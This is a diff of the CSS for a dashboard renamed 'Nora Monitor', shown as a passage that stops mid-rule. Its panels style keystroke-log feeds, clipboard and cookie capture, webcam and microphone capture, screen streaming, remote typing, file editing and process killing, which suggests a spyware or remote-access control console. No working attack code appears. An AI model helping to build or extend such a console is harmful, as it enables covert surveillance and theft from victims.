@@ -3,1099 +3,888 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Nora Hub</title>
+<title>Nora Monitor</title>
 <style>
+/* ── Reset & tokens ─────────────────────────────────────── */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 :root {
-  --bg:      #0b0d12;
-  --bg2:     #111520;
-  --bg3:     #161b27;
-  --border:  #1e2535;
-  --border2: #2a3148;
-  --accent:  #3b82f6;
-  --accent2: #1d4ed8;
-  --green:   #22c55e;
-  --red:     #ef4444;
-  --amber:   #f59e0b;
-  --text:    #e2e8f0;
-  --muted:   #94a3b8;
-  --dim:     #475569;
-  --purple:  #a78bfa;
+  --sidebar-w: 220px;
+  --hdr-h: 56px;
+  --bg: #0e1117;
+  --surface: #161b27;
+  --surface2: #1e2538;
+  --border: #252d3d;
+  --accent: #4f8ef7;
+  --accent-glow: rgba(79,142,247,.18);
+  --green: #2dd4a0;
+  --red: #f5585a;
+  --yellow: #f5c842;
+  --purple: #a78bfa;
+  --text: #e2e8f4;
+  --muted: #64748b;
+  --muted2: #8897b0;
+  --radius: 10px;
+  --shadow: 0 2px 12px rgba(0,0,0,.5);
 }
-* { margin:0; padding:0; box-sizing:border-box; }
-body { background:var(--bg); color:var(--text); font-family:'Segoe UI',system-ui,sans-serif; height:100vh; display:flex; flex-direction:column; overflow:hidden; }
+html, body { height: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+body { background: var(--bg); color: var(--text); display: flex; flex-direction: column; font-size: 14px; }
 
-/* ── Topbar ── */
+/* ── Top bar ────────────────────────────────────────────── */
 #topbar {
-  background:var(--bg2);
-  border-bottom:1px solid var(--border);
-  padding:0 14px;
-  height:46px;
-  display:flex;
-  align-items:center;
-  gap:10px;
-  flex-shrink:0;
+  height: var(--hdr-h);
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; gap: 12px;
+  padding: 0 20px;
+  flex-shrink: 0;
+  z-index: 100;
 }
-#topbar h1 { font-size:15px; font-weight:700; color:var(--accent); letter-spacing:.5px; }
-#status {
-  font-size:11px; padding:3px 10px; border-radius:20px;
-  background:var(--bg3); border:1px solid var(--border); color:var(--dim);
-  display:flex; align-items:center; gap:5px;
+#topbar .logo { font-weight: 800; font-size: 1.1rem; letter-spacing: -.03em; color: var(--accent); }
+#topbar .logo span { color: var(--text); opacity: .5; }
+#status-pill {
+  display: flex; align-items: center; gap: 6px;
+  background: var(--surface2); border: 1px solid var(--border);
+  border-radius: 999px; padding: 4px 12px;
+  font-size: .78rem; color: var(--muted2);
 }
-#status::before { content:''; width:6px; height:6px; border-radius:50%; background:var(--dim); flex-shrink:0; }
-#status.connected { color:var(--green); border-color:#16532d; }
-#status.connected::before { background:var(--green); box-shadow:0 0 5px var(--green); }
-#status.disconnected { color:var(--red); border-color:#7f1d1d; }
-#status.disconnected::before { background:var(--red); }
-#fps-info { font-size:11px; color:var(--dim); }
+#status-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--muted); transition: background .3s; }
+#status-dot.live { background: var(--green); box-shadow: 0 0 6px var(--green); }
 #agent-select {
-  background:var(--bg3); border:1px solid var(--border2); color:var(--text);
-  padding:4px 10px; border-radius:6px; font-family:inherit; font-size:12px; cursor:pointer;
+  margin-left: auto;
+  background: var(--surface2); border: 1px solid var(--border);
+  color: var(--text); border-radius: 8px;
+  padding: 6px 10px; font-size: .82rem; cursor: pointer; outline: none;
 }
-#agent-select option { background:var(--bg2); }
-.topbar-btn {
-  padding:5px 13px; border-radius:6px; border:1px solid var(--border2);
-  font-size:12px; font-family:inherit; cursor:pointer; background:var(--bg3); color:var(--muted);
-  transition:all .15s; white-space:nowrap;
+#fps-badge {
+  font-size: .72rem; color: var(--muted); background: var(--surface2);
+  border: 1px solid var(--border); border-radius: 6px; padding: 3px 8px;
 }
-.topbar-btn:hover { background:var(--border2); color:var(--text); }
-.topbar-btn.active { background:#14532d; border-color:#166534; color:var(--green); }
-.topbar-btn.active:hover { background:#7f1d1d; border-color:#991b1b; color:#fca5a5; }
-#rec-btn { margin-left:auto; }
-#rec-btn:hover:not(.recording) { background:#7f1d1d; border-color:#991b1b; color:#fca5a5; }
-#rec-btn.recording { background:#7f1d1d; border-color:#ef4444; color:#fca5a5; animation:pulse 1.2s infinite; }
-#rec-timer { font-size:11px; color:var(--red); font-weight:600; display:none; }
-#rec-timer.visible { display:block; }
-@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }
 
-/* ── Layout ── */
-#main { display:flex; flex:1; overflow:hidden; }
-#view-area { flex:1; display:flex; flex-direction:column; overflow:hidden; }
-#screen-panel { flex:1; display:flex; align-items:center; justify-content:center; background:#07090d; position:relative; overflow:hidden; }
-#screen { max-width:100%; max-height:100%; object-fit:contain; cursor:none; display:block; user-select:none; }
-#cursor { position:absolute; width:14px; height:14px; border:2px solid var(--accent); border-radius:50%; pointer-events:none; transform:translate(-50%,-50%); display:none; box-shadow:0 0 6px #3b82f666; }
+/* ── Layout ─────────────────────────────────────────────── */
+#shell { display: flex; flex: 1; overflow: hidden; }
 
-#camera-panel { height:180px; background:#050709; border-top:1px solid var(--border); display:none; align-items:center; justify-content:center; flex-shrink:0; }
-#camera-panel.visible { display:flex; }
-#camera-feed { max-height:100%; max-width:100%; object-fit:contain; display:block; }
-#cam-placeholder { color:var(--dim); font-size:12px; }
-
-/* ── Sidebar ── */
-#sidebar { width:300px; background:var(--bg2); border-left:1px solid var(--border); display:flex; flex-direction:column; flex-shrink:0; }
-.tab-bar { display:flex; background:var(--bg); border-bottom:1px solid var(--border); flex-shrink:0; }
-.tab {
-  flex:1; padding:9px 4px; font-size:11px; text-align:center; cursor:pointer;
-  color:var(--dim); letter-spacing:.3px; border-bottom:2px solid transparent;
-  transition:color .15s; font-weight:500;
+/* ── Sidebar ────────────────────────────────────────────── */
+#sidebar {
+  width: var(--sidebar-w); flex-shrink: 0;
+  background: var(--surface);
+  border-right: 1px solid var(--border);
+  display: flex; flex-direction: column;
+  overflow-y: auto;
 }
-.tab.active { color:var(--accent); border-bottom-color:var(--accent); }
-.tab:hover:not(.active) { color:var(--muted); }
-.tab-panel { flex:1; display:none; flex-direction:column; overflow:hidden; }
-.tab-panel.active { display:flex; }
+.nav-section { padding: 16px 10px 4px; }
+.nav-label { font-size: .65rem; text-transform: uppercase; letter-spacing: .1em; color: var(--muted); padding: 0 8px 6px; }
+.nav-btn {
+  display: flex; align-items: center; gap: 9px;
+  width: 100%; padding: 9px 12px;
+  background: none; border: none; border-radius: 8px;
+  color: var(--muted2); font-size: .85rem; cursor: pointer;
+  text-align: left; transition: background .15s, color .15s;
+}
+.nav-btn:hover { background: var(--surface2); color: var(--text); }
+.nav-btn.active { background: var(--accent-glow); color: var(--accent); font-weight: 600; }
+.nav-btn .icon { font-size: 1rem; width: 20px; text-align: center; }
+
+/* ── Main content ───────────────────────────────────────── */
+#main { flex: 1; overflow: hidden; display: flex; flex-direction: column; }
+
+/* ── Panels ─────────────────────────────────────────────── */
+.panel { display: none; flex: 1; overflow: hidden; flex-direction: column; }
+.panel.active { display: flex; }
 .panel-header {
-  background:var(--bg); padding:7px 10px; font-size:10px; text-transform:uppercase;
-  letter-spacing:.8px; color:var(--muted); border-bottom:1px solid var(--border);
-  display:flex; justify-content:space-between; align-items:center; flex-shrink:0; gap:6px;
-  font-weight:600;
+  padding: 16px 20px 12px;
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+  display: flex; align-items: center; gap: 10px;
 }
-.hdr-btn {
-  background:none; border:1px solid var(--border2); color:var(--dim);
-  padding:2px 8px; border-radius:4px; font-size:10px; cursor:pointer;
-  font-family:inherit; white-space:nowrap; transition:all .15s;
+.panel-header h2 { font-size: .95rem; font-weight: 700; }
+.panel-header .ph-meta { font-size: .75rem; color: var(--muted); margin-left: auto; }
+.panel-body { flex: 1; overflow-y: auto; padding: 16px 20px; }
+
+/* ── Screen panel ───────────────────────────────────────── */
+#screen-wrap {
+  flex: 1; overflow: hidden;
+  display: flex; align-items: center; justify-content: center;
+  background: #000; position: relative;
 }
-.hdr-btn:hover { border-color:var(--accent); color:var(--accent); }
-
-/* ── Keylog ── */
-#keylog { flex:1; overflow-y:auto; padding:8px; display:flex; flex-direction:column; gap:3px; }
-#keylog::-webkit-scrollbar { width:3px; }
-#keylog::-webkit-scrollbar-thumb { background:var(--border2); }
-.kl-app-header {
-  background:var(--bg3); border:1px solid var(--border2); border-left:3px solid var(--accent);
-  border-radius:4px; padding:5px 8px; font-size:10px; color:var(--muted);
-  display:flex; align-items:center; gap:6px; margin-top:6px; flex-shrink:0; font-weight:600;
+#screen-img {
+  max-width: 100%; max-height: 100%;
+  object-fit: contain; display: block;
+  cursor: crosshair;
 }
-.kl-app-name { flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:var(--text); }
-.kl-app-time { color:var(--dim); font-size:9px; flex-shrink:0; font-weight:400; }
-.kl-line {
-  background:var(--bg); border:1px solid var(--border); border-radius:4px;
-  padding:3px 7px; font-size:12px; display:flex; align-items:flex-start; gap:6px;
-  font-family:'Consolas',monospace;
+#screen-overlay {
+  position: absolute; top: 8px; right: 8px;
+  display: flex; gap: 6px;
 }
-.kl-ts { color:var(--dim); font-size:9px; flex-shrink:0; margin-top:2px; font-family:'Segoe UI',sans-serif; }
-.kl-chars { flex:1; word-break:break-all; color:var(--text); }
-.key-special { color:var(--purple); font-weight:600; }
-.key-backspace { color:var(--red); }
-
-/* ── Alert ── */
-#alert-section { border-top:1px solid var(--border); padding:8px 10px; flex-shrink:0; }
-#alert-section label { font-size:10px; color:var(--dim); text-transform:uppercase; letter-spacing:.5px; display:block; margin-bottom:5px; font-weight:600; }
-#alert-input-row { display:flex; gap:5px; }
-#alert-input { flex:1; background:var(--bg); border:1px solid var(--border2); color:var(--text); padding:4px 8px; border-radius:4px; font-family:inherit; font-size:11px; }
-#alert-add-btn { background:var(--bg3); border:1px solid var(--border2); color:var(--muted); padding:4px 10px; border-radius:4px; cursor:pointer; font-family:inherit; font-size:11px; transition:all .15s; }
-#alert-add-btn:hover { background:var(--accent); border-color:var(--accent); color:#fff; }
-#alert-tags { display:flex; flex-wrap:wrap; gap:4px; margin-top:5px; }
-.alert-tag { background:#1e3a5f; color:#60a5fa; font-size:10px; padding:2px 8px; border-radius:10px; cursor:pointer; border:1px solid #1d4ed8; }
-.alert-tag:hover { background:#7f1d1d; border-color:var(--red); color:#fca5a5; }
-
-/* ── Clipboard ── */
-#clipboard-list { flex:1; overflow-y:auto; padding:8px; display:flex; flex-direction:column; gap:5px; }
-#clipboard-list::-webkit-scrollbar { width:3px; }
-#clipboard-list::-webkit-scrollbar-thumb { background:var(--border2); }
-.clip-item { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:7px 10px; font-size:11px; color:var(--text); word-break:break-all; cursor:pointer; transition:border-color .15s; }
-.clip-item:hover { border-color:var(--accent); }
-.clip-time { font-size:9px; color:var(--dim); margin-bottom:3px; }
-.clip-text { white-space:pre-wrap; max-height:70px; overflow:hidden; }
-
-/* ── Processes ── */
-#proc-controls { display:flex; gap:6px; padding:7px 10px; border-bottom:1px solid var(--border); flex-shrink:0; align-items:center; }
-#proc-search { flex:1; background:var(--bg); border:1px solid var(--border2); color:var(--text); padding:4px 8px; border-radius:4px; font-family:inherit; font-size:11px; }
-#proc-refresh { background:var(--bg3); border:1px solid var(--border2); color:var(--muted); padding:4px 12px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; transition:all .15s; }
-#proc-refresh:hover { background:var(--accent); border-color:var(--accent); color:#fff; }
-#proc-list { flex:1; overflow-y:auto; font-size:11px; }
-#proc-list::-webkit-scrollbar { width:3px; }
-#proc-list::-webkit-scrollbar-thumb { background:var(--border2); }
-.proc-row { display:grid; grid-template-columns:1fr 46px 58px 34px; gap:4px; align-items:center; padding:5px 10px; border-bottom:1px solid var(--border); }
-.proc-row:hover { background:var(--bg3); }
-.proc-name { white-space:nowrap; overflow:hidden; text-overflow:ellipsis; color:var(--text); }
-.proc-cpu { text-align:right; color:var(--amber); font-size:10px; font-family:monospace; }
-.proc-mem { text-align:right; color:var(--accent); font-size:10px; font-family:monospace; }
-.proc-kill { background:#3a1a1a; border:1px solid #7f1d1d; color:var(--red); padding:2px 5px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; transition:all .15s; }
-.proc-kill:hover { background:var(--red); color:#fff; }
-.proc-header { display:grid; grid-template-columns:1fr 46px 58px 34px; gap:4px; padding:5px 10px; font-size:10px; color:var(--dim); border-bottom:1px solid var(--border2); text-transform:uppercase; flex-shrink:0; letter-spacing:.5px; }
-
-/* ── Control panel ── */
-#control-panel { border-top:1px solid var(--border); padding:10px 12px; font-size:11px; color:var(--dim); flex-shrink:0; }
-#control-panel label { display:flex; align-items:center; gap:8px; cursor:pointer; color:var(--muted); }
-#control-panel input[type=checkbox] { accent-color:var(--accent); }
-.hotkey-hint { font-size:10px; color:var(--dim); margin-top:4px; }
-#kbd-toggle-btn { margin-top:8px; background:var(--bg3); border:1px solid var(--border2); color:var(--muted); padding:5px 12px; border-radius:5px; cursor:pointer; font-size:11px; font-family:inherit; transition:all .15s; }
-#kbd-toggle-btn:hover { background:var(--border2); color:var(--text); }
-
-#desktop-controls { display:flex; gap:5px; margin-top:8px; flex-wrap:wrap; align-items:center; }
-.desk-btn { background:var(--bg3); border:1px solid var(--border2); color:var(--muted); padding:4px 10px; border-radius:5px; cursor:pointer; font-size:11px; font-family:inherit; transition:all .15s; }
-.desk-btn:hover { background:var(--border2); color:var(--text); }
-#win-picker { margin-top:7px; }
-#win-picker-btn { background:var(--bg3); border:1px solid #14532d; color:var(--green); padding:4px 10px; border-radius:5px; cursor:pointer; font-size:11px; font-family:inherit; transition:all .15s; }
-#win-picker-btn:hover { background:#14532d; }
-#win-target-label { font-size:10px; color:var(--green); margin-top:4px; word-break:break-all; display:none; }
-#win-stream-badge { display:none; font-size:10px; color:var(--green); margin-top:3px; }
-#win-stream-stop { background:#3a1a1a; border:none; color:var(--red); padding:2px 7px; border-radius:4px; cursor:pointer; font-size:10px; font-family:inherit; }
-
-/* ── File Manager ── */
-#fm-path-bar { display:flex; align-items:center; gap:5px; padding:6px 8px; background:var(--bg); border-bottom:1px solid var(--border); flex-shrink:0; flex-wrap:wrap; }
-#fm-breadcrumb { flex:1; min-width:0; font-size:11px; color:var(--muted); word-break:break-all; }
-#fm-up-btn { background:var(--bg3); border:1px solid var(--border2); color:var(--muted); padding:3px 9px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; flex-shrink:0; transition:all .15s; }
-#fm-up-btn:hover { background:var(--accent); border-color:var(--accent); color:#fff; }
-#fm-upload-btn { background:var(--bg3); border:1px solid #14532d; color:var(--green); padding:3px 9px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; flex-shrink:0; transition:all .15s; }
-#fm-upload-btn:hover { background:#14532d; }
-#fm-list { flex:1; overflow-y:auto; }
-#fm-list::-webkit-scrollbar { width:3px; }
-#fm-list::-webkit-scrollbar-thumb { background:var(--border2); }
-.fm-row { display:flex; align-items:center; gap:8px; padding:6px 10px; border-bottom:1px solid var(--border); cursor:pointer; font-size:11px; transition:background .1s; }
-.fm-row:hover { background:var(--bg3); }
-.fm-icon { font-size:13px; flex-shrink:0; }
-.fm-name { flex:1; min-width:0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:var(--text); }
-.fm-meta { font-size:10px; color:var(--dim); flex-shrink:0; white-space:nowrap; font-family:monospace; }
-.fm-actions { display:flex; gap:4px; flex-shrink:0; }
-.fm-dl-btn { background:#1e3a5f; border:none; color:#60a5fa; padding:2px 6px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
-.fm-dl-btn:hover { background:var(--accent); color:#fff; }
-.fm-del-btn { background:#3a1a1a; border:none; color:var(--red); padding:2px 6px; border-radius:3px; cursor:pointer; font-size:10px; font-family:inherit; }
-.fm-del-btn:hover { background:var(--red); color:#fff; }
-#fm-status { font-size:10px; color:var(--dim); padding:10px; text-align:center; }
-
-/* ── Cookies ── */
-#tab-cookies { padding:12px; }
-.ck-note { font-size:11px; color:var(--dim); line-height:1.6; margin-bottom:10px; }
-.ck-btn { width:100%; padding:8px; border-radius:6px; border:1px solid var(--border2); background:var(--bg3); color:var(--muted); font-family:inherit; font-size:12px; cursor:pointer; transition:all .15s; margin-bottom:6px; }
-.ck-btn:hover { background:var(--accent); border-color:var(--accent); color:#fff; }
-.ck-status { font-size:10px; color:var(--dim); min-height:14px; }
-.ck-divider { border:none; border-top:1px solid var(--border); margin:10px 0; }
-
-/* ── Window modal ── */
-#win-modal { display:none; position:fixed; z-index:1000; inset:0; background:#00000099; }
-#win-modal-box { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:var(--bg2); border:1px solid var(--border2); border-radius:10px; width:380px; max-height:60vh; display:flex; flex-direction:column; font-family:inherit; }
-#win-modal-title { padding:10px 14px; background:var(--bg); border-radius:10px 10px 0 0; font-size:12px; color:var(--muted); display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border); }
-#win-modal-close { background:none; border:none; color:var(--dim); font-size:16px; cursor:pointer; }
-#win-modal-close:hover { color:var(--red); }
-#win-list { overflow-y:auto; flex:1; }
-#win-list::-webkit-scrollbar { width:3px; }
-#win-list::-webkit-scrollbar-thumb { background:var(--border2); }
-.win-row { padding:8px 14px; cursor:pointer; font-size:11px; color:var(--muted); border-bottom:1px solid var(--border); display:flex; align-items:center; gap:8px; }
-.win-row:hover { background:var(--bg3); color:var(--text); }
-.win-row.selected { background:#1e3a5f; color:#60a5fa; }
-.win-hwnd { font-size:9px; color:var(--dim); flex-shrink:0; }
-#win-clear-btn { margin:8px 14px; background:#3a1a1a; border:none; color:var(--red); padding:4px 10px; border-radius:5px; cursor:pointer; font-size:11px; font-family:inherit; }
-.win-stream-btn { background:#14532d; border:none; color:var(--green); padding:2px 7px; border-radius:4px; cursor:pointer; font-size:10px; font-family:inherit; flex-shrink:0; margin-left:4px; }
-
-/* ── Remote Keyboard ── */
-#kbd-window { display:none; position:fixed; z-index:999; background:var(--bg2); border:1px solid var(--border2); border-radius:10px; box-shadow:0 8px 32px #00000080; width:300px; font-family:inherit; user-select:none; left:50%; top:50%; transform:translate(-50%,-50%); }
-#kbd-titlebar { display:flex; align-items:center; padding:9px 12px; background:var(--bg); border-radius:10px 10px 0 0; cursor:grab; gap:8px; border-bottom:1px solid var(--border); }
-#kbd-titlebar:active { cursor:grabbing; }
-#kbd-title { flex:1; font-size:12px; color:var(--muted); letter-spacing:.5px; }
-#kbd-close { background:none; border:none; color:var(--dim); font-size:16px; cursor:pointer; padding:0; line-height:1; }
-#kbd-close:hover { color:var(--red); }
-#kbd-indicator { display:flex; align-items:center; gap:6px; padding:8px 12px; font-size:11px; color:var(--dim); border-bottom:1px solid var(--border); }
-#kbd-dot { width:6px; height:6px; border-radius:50%; background:var(--dim); flex-shrink:0; transition:background .1s; }
-#kbd-dot.active { background:var(--green); box-shadow:0 0 5px var(--green); }
-#kbd-last { flex:1; color:var(--accent); font-size:11px; min-height:14px; }
-#kbd-box { width:100%; box-sizing:border-box; padding:10px 12px; background:var(--bg); border:none; border-radius:0 0 10px 10px; color:var(--text); font-family:'Consolas',monospace; font-size:13px; resize:none; outline:none; height:80px; caret-color:var(--accent); }
-#kbd-box::placeholder { color:var(--dim); }
-#kbd-hint { padding:5px 12px 9px; font-size:10px; color:var(--dim); text-align:center; }
-
-/* ── Sidebar handle (mobile) ── */
-#sidebar-handle { display:none; }
-
-@media (max-width: 768px) {
-  body { touch-action:manipulation; }
-  #topbar { padding:6px 10px; gap:6px; height:auto; flex-wrap:wrap; }
-  #topbar h1 { font-size:13px; }
-  #fps-info { display:none; }
-  #main { flex-direction:column; }
-  #view-area { height:52vh; flex:none; overflow:hidden; }
-  #screen-panel { flex:1; }
-  #camera-panel { height:100px; }
-  #sidebar { width:100%; flex:none; height:48vh; border-left:none; border-top:2px solid var(--border); transition:height .25s; overflow:hidden; }
-  #sidebar.collapsed { height:38px; }
-  #sidebar-handle { display:flex; align-items:center; justify-content:space-between; padding:0 12px; height:38px; background:var(--bg); border-bottom:1px solid var(--border); cursor:pointer; flex-shrink:0; user-select:none; }
-  #sidebar-handle span { font-size:10px; color:var(--accent); text-transform:uppercase; letter-spacing:.8px; font-weight:600; }
-  #sidebar-handle svg { width:14px; height:14px; fill:var(--dim); transition:transform .25s; }
-  #sidebar.collapsed #sidebar-handle svg { transform:rotate(180deg); }
-  .tab-bar { display:none; }
-  #sidebar:not(.collapsed) .tab-bar { display:flex; }
-  .tab { padding:9px 4px; min-height:36px; }
-  .topbar-btn { padding:5px 10px; font-size:11px; }
-  #rec-btn { margin-left:0; }
-  .hotkey-hint { display:none; }
-  .proc-row { grid-template-columns:1fr 38px 46px 32px; }
-  .proc-kill { min-height:28px; }
-  .hdr-btn { min-height:28px; }
-  #alert-input { font-size:13px; }
+.screen-btn {
+  background: rgba(0,0,0,.6); border: 1px solid rgba(255,255,255,.15);
+  color: #fff; border-radius: 6px; padding: 5px 10px;
+  font-size: .75rem; cursor: pointer;
 }
-@media (max-width: 480px) {
-  .topbar-btn .btn-label { display:none; }
+.screen-btn:hover { background: rgba(255,255,255,.12); }
+#remote-kb {
+  background: var(--surface); border-top: 1px solid var(--border);
+  padding: 10px 16px; display: flex; gap: 8px; flex-shrink: 0;
+}
+#remote-kb input {
+  flex: 1; background: var(--surface2); border: 1px solid var(--border);
+  color: var(--text); border-radius: 8px; padding: 8px 12px; font-size: .85rem;
+  outline: none;
+}
+#remote-kb input:focus { border-color: var(--accent); }
+#remote-kb button {
+  background: var(--accent); border: none; color: #fff;
+  border-radius: 8px; padding: 8px 14px; font-size: .82rem; cursor: pointer;
+  font-weight: 600;
+}
+#desktop-ctrl {
+  background: var(--surface); border-top: 1px solid var(--border);
+  padding: 8px 16px; display: flex; gap: 6px; flex-shrink: 0; flex-wrap: wrap;
+}
+.ctrl-btn {
+  background: var(--surface2); border: 1px solid var(--border);
+  color: var(--text); border-radius: 7px; padding: 5px 12px;
+  font-size: .78rem; cursor: pointer;
+}
+.ctrl-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+/* ── Keylog panel ───────────────────────────────────────── */
+#kl-toolbar {
+  padding: 10px 20px;
+  display: flex; gap: 8px; align-items: center;
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+}
+#kl-toolbar button {
+  background: var(--surface2); border: 1px solid var(--border);
+  color: var(--text); border-radius: 7px;
+  padding: 6px 14px; font-size: .8rem; cursor: pointer;
+}
+#kl-toolbar button:hover { border-color: var(--accent); color: var(--accent); }
+#kl-toolbar button.danger:hover { border-color: var(--red); color: var(--red); }
+#kl-export-link {
+  margin-left: auto;
+  background: var(--accent); color: #fff; border: none;
+  border-radius: 7px; padding: 6px 14px; font-size: .8rem;
+  cursor: pointer; font-weight: 600; text-decoration: none;
+  display: flex; align-items: center; gap: 5px;
+}
+#kl-export-link:hover { opacity: .85; }
+#kl-feed { flex: 1; overflow-y: auto; padding: 12px 20px; font-family: "SF Mono","Fira Code",monospace; font-size: .82rem; }
+.kl-app-block { margin-bottom: 4px; }
+.kl-app-hdr {
+  display: flex; align-items: center; gap: 8px;
+  padding: 6px 10px 4px;
+  color: var(--accent); font-size: .75rem; font-weight: 700;
+  border-left: 3px solid var(--accent);
+  margin-bottom: 2px;
+}
+.kl-app-hdr .app-time { color: var(--muted); font-weight: 400; margin-left: auto; font-size: .7rem; }
+.kl-line { padding: 2px 10px 2px 13px; color: var(--text); line-height: 1.7; word-break: break-all; }
+.kl-bs { color: var(--red); }
+.kl-sp { color: var(--purple); }
+.kl-ts { color: var(--muted); font-size: .7rem; margin-right: 6px; }
+
+/* ── Camera panel ───────────────────────────────────────── */
+#cam-wrap {
+  flex: 1; display: flex; align-items: center; justify-content: center;
+  background: #000;
+}
+#cam-img { max-width: 100%; max-height: 100%; object-fit: contain; }
+#cam-ctrl {
+  background: var(--surface); border-top: 1px solid var(--border);
+  padding: 10px 16px; display: flex; gap: 8px; flex-shrink: 0;
+}
+.toggle-btn {
+  background: var(--surface2); border: 1px solid var(--border);
+  color: var(--text); border-radius: 8px; padding: 7px 16px;
+  font-size: .82rem; cursor: pointer; font-weight: 600;
+}
+.toggle-btn.on { background: var(--accent-glow); border-color: var(--accent); color: var(--accent); }
+
+/* ── Microphone ─────────────────────────────────────────── */
+#mic-panel .panel-body { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px; }
+#mic-vis {
+  width: 120px; height: 120px; border-radius: 50%;
+  border: 3px solid var(--border);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 2.5rem;
+  background: var(--surface2);
+  transition: border-color .3s, box-shadow .3s;
+}
+#mic-vis.active { border-color: var(--red); box-shadow: 0 0 24px rgba(245,88,90,.3); }
+#mic-label { color: var(--muted); font-size: .9rem; }
+
+/* ── Processes ──────────────────────────────────────────── */
+#proc-toolbar {
+  padding: 10px 20px; border-bottom: 1px solid var(--border);
+  display: flex; gap: 8px; flex-shrink: 0;
+}
+#proc-search {
+  flex: 1; background: var(--surface2); border: 1px solid var(--border);
+  color: var(--text); border-radius: 8px; padding: 7px 12px; font-size: .82rem; outline: none;
+}
+#proc-search:focus { border-color: var(--accent); }
+#proc-refresh {
+  background: var(--surface2); border: 1px solid var(--border);
+  color: var(--text); border-radius: 8px; padding: 7px 12px;
+  font-size: .82rem; cursor: pointer;
+}
+#proc-list { flex: 1; overflow-y: auto; }
+.proc-row {
+  display: flex; align-items: center; gap: 10px;
+  padding: 8px 20px; border-bottom: 1px solid var(--border);
+  transition: background .12s;
+}
+.proc-row:hover { background: var(--surface2); }
+.proc-name { flex: 1; font-size: .83rem; font-weight: 500; }
+.proc-pid { color: var(--muted); font-size: .75rem; width: 50px; text-align: right; }
+.proc-cpu { color: var(--muted2); font-size: .75rem; width: 56px; text-align: right; }
+.proc-mem { color: var(--muted2); font-size: .75rem; width: 64px; text-align: right; }
+.proc-kill {
+  background: none; border: 1px solid var(--border);
+  color: var(--red); border-radius: 6px; padding: 3px 9px;
+  font-size: .72rem; cursor: pointer;
+}
+.proc-kill:hover { background: rgba(245,88,90,.12); }
+
+/* ── File Manager ───────────────────────────────────────── */
+#fm-path-bar {
+  padding: 10px 20px; border-bottom: 1px solid var(--border);
+  display: flex; gap: 8px; flex-shrink: 0;
+}
+#fm-path {
+  flex: 1; background: var(--surface2); border: 1px solid var(--border);
+  color: var(--text); border-radius: 8px; padding: 7px 12px; font-size: .82rem;
+  outline: none; font-family: monospace;
+}
+#fm-path:focus { border-color: var(--accent); }
+#fm-go {
+  background: var(--accent); border: none; color: #fff;
+  border-radius: 8px; padding: 7px 14px; font-size: .82rem; cursor: pointer;
+}
+#fm-list { flex: 1; overflow-y: auto; }
+.fm-row {
+  display: flex; align-items: center; gap: 10px;
+  padding: 8px 20px; border-bottom: 1px solid var(--border);
+  cursor: pointer; transition: background .12s;
+}
+.fm-row:hover { background: var(--surface2); }
+.fm-icon { width: 20px; text-align: center; font-size: 1rem; }
+.fm-name { flex: 1; font-size: .83rem; }
+.fm-size { color: var(--muted); font-size: .75rem; }
+.fm-del {
+  background: none; border: 1px solid var(--border);
+  color: var(--red); border-radius: 6px; padding: 3px 9px;
+  font-size: .72rem; cursor: pointer;
+}
+.fm-del:hover { background: rgba(245,88,90,.12); }
+#fm-editor {
+  background: var(--surface); border-top: 1px solid var(--border);
+  padding: 12px 20px; flex-shrink: 0; display: none; flex-direction: column; gap: 8px;
+}
+#fm-editor.show { display: flex; }
+#fm-editor-path { font-size: .75rem; color: var(--muted); font-family: monospace; }
+#fm-textarea {
+  background: var(--surface2); border: 1px solid var(--border);
+  color: var(--text); border-radius: 8px; padding: 10px 12px;
+  font-family: monospace; font-size: .82rem;
+  resize: vertical; min-height: 140px; outline: none;
+}
+#fm-textarea:focus { border-color: var(--accent); }
+#fm-save {
+  align-self: flex-end;
+  background: var(--accent); border: none; color: #fff;
+  border-radius: 8px; padding: 7px 16px; font-size: .82rem; cursor: pointer;
+}
+
+/* ── Cookies ────────────────────────────────────────────── */
+#cookie-panel .panel-body { display: flex; flex-direction: column; gap: 12px; }
+.big-btn {
+  background: var(--surface2); border: 1px solid var(--border);
+  color: var(--text); border-radius: 10px;
+  padding: 14px 20px; font-size: .9rem; cursor: pointer;
+  text-align: left; transition: border-color .15s;
+  display: flex; align-items: center; gap: 12px;
+  width: 100%;
+}
+.big-btn:hover { border-color: var(--accent); }
+.big-btn .bicon { font-size: 1.4rem; }
+.big-btn .binfo strong { display: block; font-weight: 700; }
+.big-btn .binfo span { color: var(--muted); font-size: .78rem; }
+#cookie-status { padding: 10px 14px; background: var(--surface2); border-radius: 8px; font-size: .82rem; color: var(--muted2); min-height: 40px; }
+
+/* ── Recording ──────────────────────────────────────────── */
+#rec-panel .panel-body { display: flex; flex-direction: column; align-items: center; gap: 16px; }
+#rec-indicator {
+  width: 80px; height: 80px; border-radius: 50%;
+  background: var(--surface2); border: 3px solid var(--border);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 2rem; transition: border-color .3s, box-shadow .3s;
+}
+#rec-indicator.recording { border-color: var(--red); box-shadow: 0 0 20px rgba(245,88,90,.4); animation: pulse 1s ease-in-out infinite; }
+@keyframes pulse { 0%,100%{box-shadow:0 0 16px rgba(245,88,90,.35)} 50%{box-shadow:0 0 32px rgba(245,88,90,.6)} }
+#rec-label { color: var(--muted); }
+#rec-btn {
+  background: var(--accent); border: none; color: #fff;
